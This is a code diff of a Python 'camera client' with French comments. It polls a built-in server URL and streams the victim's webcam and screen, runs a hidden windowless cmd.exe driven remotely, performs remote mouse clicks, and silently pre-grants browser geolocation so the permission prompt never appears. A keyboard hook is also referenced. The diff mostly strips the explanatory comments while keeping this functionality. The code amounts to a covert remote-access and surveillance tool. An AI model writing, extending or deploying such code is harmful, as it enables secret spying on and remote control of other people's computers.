@@ -52,8 +52,6 @@ except ImportError:
     _HAS_PYNPUT = False
 
 try:
-    # Fichier généré par build_windows.bat : contient l'URL du serveur
-    # intégrée dans le .exe (SERVER_URL = "https://...").
     from embedded_config import SERVER_URL as EMBEDDED_SERVER_URL
 except ImportError:
     EMBEDDED_SERVER_URL = ""
@@ -67,8 +65,8 @@ except ImportError:
 
 
 DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
-POLL_INTERVAL = 1.0           # secondes entre deux vérifications de commandes
-CAMERA_FRAME_INTERVAL = 0.05  # intervalle MINIMUM entre deux envois caméra (~20 im/s max)
+POLL_INTERVAL = 1.0
+CAMERA_FRAME_INTERVAL = 0.05
 CAMERA_WIDTH = 640
 CAMERA_HEIGHT = 480
 CAMERA_JPEG_QUALITY = 65
@@ -91,15 +89,10 @@ SCREEN_FAILURE_FALLBACK_THRESHOLD = 10
 SCREEN_FAILURE_WARN_AT = 5
 MOUSE_SEND_INTERVAL = 0.1
 
-# Shell / chat
-SHELL_STREAM_MIN_INTERVAL = 0.05   # ~20 envois/s max pour le flux console
+SHELL_STREAM_MIN_INTERVAL = 0.05
 SHELL_STREAM_CHUNK = 4096
-SHELL_STREAM_BUFFER_MAX = 16384    # taille max d'un chunk envoyé au serveur
+SHELL_STREAM_BUFFER_MAX = 16384
 
-
-# ---------------------------------------------------------------------
-# Emplacements (adaptés à l'OS) : logs + configuration
-# ---------------------------------------------------------------------
 
 def _app_dir() -> Path:
     if platform.system() == "Windows":
@@ -111,10 +104,6 @@ def _app_dir() -> Path:
 APP_DIR = _app_dir()
 APP_DIR.mkdir(parents=True, exist_ok=True)
 CONFIG_PATH = APP_DIR / "config.json"
-# Profil Chrome/Edge DÉDIÉ à la fenêtre de localisation (distinct du profil
-# par défaut de l'utilisateur) : persistant d'un lancement à l'autre, et
-# pré-autorisé pour la géolocalisation (voir _grant_geolocation_permission),
-# afin que le popup d'autorisation du navigateur n'apparaisse JAMAIS.
 LOCATION_PROFILE_DIR = APP_DIR / "location-browser-profile"
 
 logging.basicConfig(
@@ -140,13 +129,12 @@ def load_config() -> dict:
 def _write_config(config: dict) -> None:
     CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")
     try:
-        os.chmod(CONFIG_PATH, 0o600)  # pas d'effet sous Windows, inoffensif
+        os.chmod(CONFIG_PATH, 0o600)
     except OSError:
         pass
 
 
 def save_config(server_url: str) -> None:
-    """Sauvegarde l'URL du serveur SANS écraser le device_id déjà mémorisé."""
     config = load_config()
     config["server_url"] = server_url
     config.setdefault("device_id", uuid.uuid4().hex)
@@ -155,13 +143,10 @@ def save_config(server_url: str) -> None:
 
 
 def get_or_create_device_id() -> str:
-    """Identifiant unique et permanent de CET appareil, pour que le serveur
-    puisse distinguer plusieurs clients différents."""
     config = load_config()
     device_id = config.get("device_id")
     if device_id:
         return device_id
-
     device_id = uuid.uuid4().hex
     config["device_id"] = device_id
     _write_config(config)
@@ -181,8 +166,6 @@ def resolve_server_url(cli_value: str | None) -> str:
 
 
 def _open_camera() -> cv2.VideoCapture:
-    """Ouvre la caméra avec le backend le plus fiable selon l'OS, réglée pour
-    la FAIBLE LATENCE (tampon d'une seule image, MJPG, résolution modeste)."""
     if platform.system() == "Windows":
         capture = cv2.VideoCapture(0, cv2.CAP_DSHOW)
     else:
@@ -197,7 +180,7 @@ def _open_camera() -> cv2.VideoCapture:
 
 
 # ---------------------------------------------------------------------
-# Navigateur de localisation (ouvert/fermé à la demande du server-gui)
+# Navigateur de localisation
 # ---------------------------------------------------------------------
 
 LOCATION_BROWSER_CANDIDATES_LINUX = (
@@ -214,19 +197,12 @@ LOCATION_WINDOW_SIZE = "420,640"
 
 
 def _geolocation_origin_pattern(url: str) -> str:
-    """Construit le motif d'origine attendu par Chrome/Edge pour une
-    exception de contenu (« https://hôte:port,* »). Le port est explicite
-    même par défaut (443/80), car Chrome le stocke toujours ainsi."""
     parsed = urlparse(url)
     port = parsed.port or (443 if parsed.scheme == "https" else 80)
     return f"{parsed.scheme}://{parsed.hostname}:{port},*"
 
 
 def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
-    """Pré-autorise la géolocalisation pour l'origine DU SERVEUR dans le
-    fichier Preferences du profil Chrome/Edge dédié à cette fenêtre, AVANT
-    de l'ouvrir. Résultat : le popup natif d'autorisation n'apparaît plus
-    jamais, pas même une première fois."""
     default_dir = profile_dir / "Default"
     default_dir.mkdir(parents=True, exist_ok=True)
     prefs_path = default_dir / "Preferences"
@@ -244,7 +220,7 @@ def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
     )
     exceptions[_geolocation_origin_pattern(server_url)] = {
         "last_modified": f"{time.time():.6f}",
-        "setting": 1,  # CONTENT_SETTING_ALLOW
+        "setting": 1,
     }
 
     try:
@@ -254,8 +230,6 @@ def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
 
 
 def _find_app_mode_browser() -> "str | None":
-    """Cherche un navigateur Chromium (Chrome/Edge/Chromium) capable du mode
-    --app. Si aucun n'est trouvé, l'appelant se rabat sur webbrowser.open()."""
     if platform.system() == "Windows":
         for path in LOCATION_BROWSER_CANDIDATES_WINDOWS:
             if os.path.exists(path):
@@ -269,23 +243,18 @@ def _find_app_mode_browser() -> "str | None":
 
 
 # ---------------------------------------------------------------------
-# Capture d'écran : mss (X11, Windows) + replis Wayland
+# Capture d'écran : mss + replis Wayland
 # ---------------------------------------------------------------------
 
 def _detect_linux_session_type() -> str:
-    """'wayland', 'x11', ou '' si indéterminé (variable absente)."""
     return os.environ.get("XDG_SESSION_TYPE", "").lower()
 
 
 def _frame_looks_valid(frame) -> bool:
-    """Un frame "valide" doit exister ET ne pas être quasi uniforme (ce
-    qui arrive quand une méthode de capture échoue silencieusement et
-    renvoie une image noire ou grise au lieu de lever une erreur)."""
     return frame is not None and frame.size > 0 and float(frame.std()) >= MIN_VALID_FRAME_STD
 
 
 def _grab_screen_grim() -> "np.ndarray | None":
-    """Capture via grim (compositeurs wlroots : Sway, Hyprland...)."""
     result = subprocess.run(
         ["grim", "-"], capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True
     )
@@ -294,8 +263,6 @@ def _grab_screen_grim() -> "np.ndarray | None":
 
 
 def _grab_screen_gnome_screenshot() -> "np.ndarray | None":
-    """Repli via la commande gnome-screenshot (peut être absente sur les
-    versions récentes de GNOME, qui l'ont retirée du cœur du système)."""
     tmp_path = None
     try:
         with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
@@ -314,9 +281,6 @@ def _grab_screen_gnome_screenshot() -> "np.ndarray | None":
 
 
 def _read_portal_screenshot(uri: str) -> "np.ndarray | None":
-    """Lit (puis supprime) le fichier désigné par l'URI renvoyée par le portail.
-    L'URI est encodée en pourcentage : sans décodage, cv2.imread ne trouve
-    pas le fichier et renvoie None à chaque image."""
     path = unquote(urlparse(uri).path)
     image = cv2.imread(path)
     try:
@@ -327,8 +291,6 @@ def _read_portal_screenshot(uri: str) -> "np.ndarray | None":
 
 
 def _grab_screen_xdg_portal_jeepney() -> "np.ndarray | None":
-    """Capture via le portail avec UNE connexion D-Bus qui fait l'appel ET
-    attend le signal Response (indispensable : voir _grab_screen_xdg_portal_gdbus)."""
     from jeepney import DBusAddress, MatchRule, message_bus, new_method_call
     from jeepney.io.blocking import Proxy, open_dbus_connection
 
@@ -341,7 +303,7 @@ def _grab_screen_xdg_portal_jeepney() -> "np.ndarray | None":
             type="signal", interface="org.freedesktop.portal.Request",
             member="Response", path=request_path,
         )
-        Proxy(message_bus, conn).AddMatch(rule)   # AVANT l'appel, sinon la réponse peut être manquée
+        Proxy(message_bus, conn).AddMatch(rule)
         with conn.filter(rule) as responses:
             portal = DBusAddress(
                 "/org/freedesktop/portal/desktop",
@@ -360,12 +322,11 @@ def _grab_screen_xdg_portal_jeepney() -> "np.ndarray | None":
     code, results = signal.body
     uri = results.get("uri", (None, None))[1]
     if code != 0 or not uri:
-        return None   # 1 = annulé par l'utilisateur, 2 = échec
+        return None
     return _read_portal_screenshot(uri)
 
 
 def _grab_screen_xdg_portal() -> "np.ndarray | None":
-    """Capture via le portail : jeepney si disponible, sinon gdbus."""
     try:
         import jeepney  # noqa: F401
     except ImportError:
@@ -374,9 +335,6 @@ def _grab_screen_xdg_portal() -> "np.ndarray | None":
 
 
 def _grab_screen_xdg_portal_gdbus() -> "np.ndarray | None":
-    """Capture via xdg-desktop-portal. L'appel est asynchrone : il renvoie
-    d'abord un "handle" (ticket), et le résultat réel (l'URI du fichier)
-    arrive ensuite via un signal "Response" séparé, qu'il faut écouter."""
     monitor = subprocess.Popen(
         ["gdbus", "monitor", "--session", "--dest", "org.freedesktop.portal.Desktop"],
         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
@@ -440,9 +398,6 @@ def _portal_available() -> bool:
 
 
 def _screen_capture_candidates() -> list:
-    """Retourne les méthodes de capture à essayer, par ordre de préférence.
-    Sous Wayland, chacune est testée avec une VRAIE capture dont le CONTENU
-    est vérifié. « mss » est toujours en dernier."""
     if platform.system() != "Linux" or _detect_linux_session_type() != "wayland":
         return ["mss"]
 
@@ -477,10 +432,6 @@ def _screen_capture_candidates() -> list:
 
 
 class _LatestFrame:
-    """Case partagée qui ne garde que la DERNIÈRE image. Les threads d'envoi
-    sont réveillés INSTANTANÉMENT à l'arrivée d'une image et chaque image
-    n'est prise que par UN seul thread."""
-
     def __init__(self):
         self._cond = threading.Condition()
         self._frame = None
@@ -504,8 +455,6 @@ class _LatestFrame:
 
 
 class _RateLimiter:
-    """Espace les envois d'au moins `interval` secondes, tous threads confondus."""
-
     def __init__(self, interval: float):
         self._interval = interval
         self._lock = threading.Lock()
@@ -520,15 +469,10 @@ class _RateLimiter:
 
 
 # ---------------------------------------------------------------------
-# Console distante (CMD Commandes) — cmd.exe persistant, sans fenêtre,
-# stdout/stderr redirigés vers le serveur.
+# Console distante (CMD Commandes)
 # ---------------------------------------------------------------------
 
 class RemoteConsole:
-    """cmd.exe persistant, sans fenêtre, avec pipes stdin/stdout/stderr.
-    La sortie est envoyée au serveur comme les frames caméra ; les
-    commandes viennent de server_gui. Aucune fenêtre visible côté client."""
-
     def __init__(self, server_url: str, device_id: str):
         self.server_url = server_url
         self.device_id = device_id
@@ -680,30 +624,23 @@ class CameraClient:
         self._stop_camera_event = threading.Event()
         self._camera_capture_thread: threading.Thread | None = None
         self._camera_slot = _LatestFrame()
-        # Session HTTP persistante (keep-alive) pour les commandes ; chaque
-        # thread d'envoi d'images a la sienne (voir _sender_worker).
         self._cmd_session = requests.Session()
         self._stop_screen_event = threading.Event()
         self._screen_slot = _LatestFrame()
 
-        # Localisation : navigateur ouvert chez CE client, piloté par le server-gui.
         self.location_open = False
         self._location_process: subprocess.Popen | None = None
 
-        # Souris : position envoyée au serveur quand le flux écran est actif,
-        # clics reçus du serveur exécutés localement.
         self._mouse_thread: threading.Thread | None = None
         self._stop_mouse_event = threading.Event()
         self._mouse_controller = _MouseController() if _HAS_PYNPUT else None
         self._screen_size: tuple[int, int] | None = None
 
-        # CMD Commandes : console persistante sans fenêtre
         self._remote_console = RemoteConsole(server_url, device_id)
 
-        # Chat : vraie console visible (Windows uniquement).
-        # IMPORTANT : titre ASCII pur, pour que _find_hwnd() le retrouve de
-        # façon fiable dans la liste des fenêtres Windows (un tiret cadratin
-        # ou un accent peut être altéré par la code page de cmd.exe).
+        # Titre ASCII pur pour que la fenêtre soit facile à retrouver.
+        # (La recherche réelle se fait par PID, pas par titre, mais un titre
+        # ASCII évite tout problème d'encodage dans cmd.exe.)
         self._chat_console: "ChatConsole | None" = None
         if _HAS_CHAT_CONSOLE:
             self._chat_console = ChatConsole(
@@ -711,7 +648,6 @@ class CameraClient:
                 on_user_input=self._handle_user_chat,
             )
 
-    # ------------------------------------------------------------------
     def run_forever(self) -> None:
         logger.info(
             "Démarrage du client — serveur : %s — appareil : %s (%s)",
@@ -723,9 +659,6 @@ class CameraClient:
             except requests.RequestException as exc:
                 logger.warning("Serveur injoignable (%s), nouvelle tentative...", exc)
             except Exception as exc:
-                # Filet de sécurité : une erreur inattendue dans le traitement
-                # d'une commande (ex. console chat, localisation) ne doit JAMAIS
-                # faire sortir de run_forever : le client se déconnecterait.
                 logger.exception("Erreur inattendue dans _check_commands : %s", exc)
             time.sleep(POLL_INTERVAL)
 
@@ -745,9 +678,6 @@ class CameraClient:
                 logger.warning("Erreur lors de la fermeture de la console chat : %s", exc)
 
     def _check_commands(self) -> None:
-        # Si l'UTILISATEUR a fermé lui-même la fenêtre du navigateur de
-        # localisation (plutôt que la GUI), on le détecte ici AVANT d'envoyer
-        # le statut : sinon la GUI afficherait "ouvert" indéfiniment.
         if self._location_process is not None and self._location_process.poll() is not None:
             self._location_process = None
             self.location_open = False
@@ -792,19 +722,16 @@ class CameraClient:
             except (KeyError, TypeError, ValueError) as exc:
                 logger.warning("Commande de clic invalide : %s (%s)", mouse_click, exc)
 
-        # CMD Commandes : ouverture/fermeture de la console persistante
         console_cmd = commands.get("cmd_console")
         if console_cmd == "OPEN" and not self._remote_console.is_running():
             self._remote_console.start()
         elif console_cmd == "CLOSE" and self._remote_console.is_running():
             self._remote_console.stop()
 
-        # Une commande à écrire dans stdin du cmd.exe persistant
         shell_input = commands.get("shell_input")
         if shell_input and self._remote_console.is_running():
             self._remote_console.write_command(shell_input.get("text", ""))
 
-        # Chat : message de la GUI -> console visible du client
         chat_msg = commands.get("chat_message")
         if chat_msg and self._chat_console is not None:
             try:
@@ -813,7 +740,6 @@ class CameraClient:
             except Exception as exc:
                 logger.exception("Erreur lors de l'injection du message chat : %s", exc)
 
-        # Chat : ouverture/fermeture de la console visible (GUI seule décide)
         chat_window_cmd = commands.get("chat_window")
         if self._chat_console is not None:
             try:
@@ -824,17 +750,7 @@ class CameraClient:
             except Exception as exc:
                 logger.exception("Erreur lors de la gestion de la console chat : %s", exc)
 
-    # ------------------------------------------------------------------
-    # Chat : appelée par le hook clavier quand l'utilisateur tape
-    # ------------------------------------------------------------------
     def _handle_user_chat(self, line: str) -> None:
-        """L'utilisateur a tapé un message dans la console chat. On l'envoie
-        au serveur, puis on injecte localement 'echo Toi: <line>' pour
-        l'afficher (Solution B — préfixe invisible).
-
-        NOTE : cette méthode est appelée depuis un callback Win32
-        (WH_KEYBOARD_LL) ; une exception non attrapée ici serait fatale
-        pour le thread du hook. On enveloppe donc tout dans try/except."""
         try:
             requests.post(
                 f"{self.server_url}/api/shell/result",
@@ -850,7 +766,6 @@ class CameraClient:
         except Exception as exc:
             logger.exception("Erreur lors de l'envoi du message chat : %s", exc)
 
-        # Affichage local : "echo Toi: <line>"
         try:
             if self._chat_console is not None and self._chat_console.is_open():
                 safe = (
@@ -861,7 +776,7 @@ class CameraClient:
                     .replace(">", "^>")
                     .replace('"', "'")
                 )
-                self._chat_console._send_text(f"echo Toi: {safe}\r")
+                self._chat_console._send_text(f"echo Toi: {safe}\r", force=True)
         except Exception as exc:
             logger.exception("Erreur lors de l'affichage local du message chat : %s", exc)
 
@@ -901,7 +816,6 @@ class CameraClient:
         logger.info("Caméra éteinte")
 
     def _camera_capture_loop(self, capture: cv2.VideoCapture, stop_event: threading.Event, slot: _LatestFrame) -> None:
-        """Lit la caméra EN CONTINU, sans jamais attendre le réseau."""
         failures = 0
         while not stop_event.is_set():
             ok, frame = capture.read()
@@ -922,7 +836,6 @@ class CameraClient:
 
     def _sender_worker(self, stream: str, slot: _LatestFrame, stop_event: threading.Event,
                        rate: _RateLimiter) -> None:
-        """Poste toujours la DERNIÈRE image disponible, sans pause inutile."""
         session = requests.Session()
         while not stop_event.is_set():
             delay = rate.reserve()
@@ -955,7 +868,6 @@ class CameraClient:
         logger.info("Capture d'écran arrêtée")
 
     def _capture_screen_loop(self, stop_event: threading.Event, slot: _LatestFrame) -> None:
-        """Capture en continu, SANS jamais attendre le réseau."""
         candidates = _screen_capture_candidates()
         mode_index = 0
         mode = candidates[mode_index]
@@ -977,13 +889,11 @@ class CameraClient:
 
                 if frame is None:
                     consecutive_failures += 1
-
                     if consecutive_failures == SCREEN_FAILURE_WARN_AT:
                         logger.warning(
                             "Capture d'écran : %d échecs consécutifs avec la méthode '%s'.",
                             consecutive_failures, mode,
                         )
-
                     if mode != "mss" and consecutive_failures >= SCREEN_FAILURE_FALLBACK_THRESHOLD:
                         mode_index += 1
                         next_mode = candidates[mode_index]
@@ -995,7 +905,6 @@ class CameraClient:
                         if mode == "mss":
                             mss_instance, monitor = self._open_mss()
                         consecutive_failures = 0
-
                     stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
                     continue
 
@@ -1018,7 +927,6 @@ class CameraClient:
                     black_frame_warned = True
 
                 slot.put(frame)
-
                 stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
         finally:
             if mss_instance is not None:
@@ -1042,7 +950,7 @@ class CameraClient:
         return _grab_screen_mss(mss_instance, monitor)
 
     # ------------------------------------------------------------------
-    # Souris : position envoyée, clics exécutés localement
+    # Souris
     # ------------------------------------------------------------------
     def _start_mouse_tracking(self) -> None:
         if self._mouse_thread is not None and self._mouse_thread.is_alive():
@@ -1061,7 +969,6 @@ class CameraClient:
             self._mouse_thread = None
 
     def _get_mouse_position(self) -> "tuple[int, int] | None":
-        """Position (x, y) de la souris, indépendamment du backend."""
         if self._mouse_controller is not None:
             try:
                 return tuple(self._mouse_controller.position)
@@ -1101,7 +1008,6 @@ class CameraClient:
             stop_event.wait(MOUSE_SEND_INTERVAL)
 
     def _activate_window_at(self, x: int, y: int) -> None:
-        """Active la fenêtre située sous (x, y) AVANT le clic."""
         try:
             if platform.system() == "Windows":
                 import ctypes
@@ -1147,9 +1053,7 @@ class CameraClient:
             return False
 
     def _click_mouse(self, x: int, y: int) -> None:
-        """Déplace la souris puis clique (bouton gauche) aux coordonnées demandées."""
         self._activate_window_at(x, y)
-
         if self._mouse_controller is not None:
             try:
                 self._mouse_controller.position = (int(x), int(y))
@@ -1170,10 +1074,7 @@ class CameraClient:
             return
 
         try:
-            subprocess.run(
-                ["xdotool", "mousemove", str(int(x)), str(int(y))],
-                timeout=2, check=False,
-            )
+            subprocess.run(["xdotool", "mousemove", str(int(x)), str(int(y))], timeout=2, check=False)
             time.sleep(0.02)
             subprocess.run(["xdotool", "mousedown", "1"], timeout=2, check=False)
             time.sleep(0.05)
@@ -1186,7 +1087,6 @@ class CameraClient:
     # Navigateur de localisation
     # ------------------------------------------------------------------
     def _open_location_browser(self) -> None:
-        """Ouvre, chez CE client, un navigateur sur la page de localisation."""
         url = f"{self.server_url}/location/page?device_id={self.device_id}"
         browser_path = _find_app_mode_browser()
         try:
@@ -1229,7 +1129,7 @@ class CameraClient:
         logger.info("Navigateur de localisation fermé (ou déjà fermé)")
 
     # ------------------------------------------------------------------
-    # Envoi au serveur (commun aux deux flux)
+    # Envoi au serveur
     # ------------------------------------------------------------------
     def _send_frame(self, frame, stream: str, session: requests.Session, ts: int) -> None:
         if stream == "screen":
